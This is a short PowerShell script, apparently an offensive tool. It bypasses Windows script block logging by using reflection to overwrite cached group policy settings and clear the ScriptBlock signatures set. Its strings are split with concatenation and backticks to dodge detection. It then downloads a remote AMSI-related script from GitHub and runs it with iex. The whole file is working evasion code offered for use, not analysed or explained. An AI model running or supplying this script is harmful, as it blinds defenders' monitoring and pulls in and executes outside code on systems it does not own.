try
{
        Write-host " "
        $pathk = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Scr"+"iptB"+"lockLo"+"gging"

	    $value = Get-ItemProperty -Path $pathk -ErrorAction Stop | Select-Object -ExpandProperty 'EnableScript'+'BlockLogging' -ErrorAction Stop
	    if($value -ne 1)
        {
            throw "Script block logging not enabled"
        }
        Write-host "Script block logging enabled"
        Write-host " "
        Write-host "Running script block logging bypass"
        $settings = [Ref].Assembly.GetType("System.Management.Automation.Utils")."GetFie`ld"("cachedGroupPolicySettings","NonPu"+"blic,Static").GetValue($null);
        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'] = @{}
        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'].Add('EnableScr'+'iptBlockLogging',"0")
        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'].Add('EnableScri'+'ptBlockInvoca'+'tionLogging',"0")
	[Ref].Assembly.GetType("System.Management.Automation.ScriptBlock")."GetFie`ld"("signatures","NonPub"+"lic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))

}
catch 
{
	    Write-host "Script block logging not enabled"
}

iex((New-Object system.net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/AMSI-Setup.ps1'))
